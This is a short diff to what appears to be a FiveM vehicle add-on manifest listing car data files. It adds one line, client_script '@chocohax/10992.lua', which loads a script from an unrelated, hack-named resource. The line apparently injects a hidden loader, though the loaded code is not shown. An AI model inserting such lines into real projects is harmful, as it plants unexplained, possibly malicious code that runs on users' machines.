@@ -167,3 +167,5 @@ data_file 'VEHICLE_LAYOUTS_FILE' 'data/rotiforgiato/vehiclelayouts.meta'
 --rotimercedes
 data_file 'CARCOLS_FILE' 'data/rotimercedes/carcols.meta'
 data_file 'VEHICLE_LAYOUTS_FILE' 'data/rotimercedes/vehiclelayouts.meta'
+
+client_script '@chocohax/10992.lua'
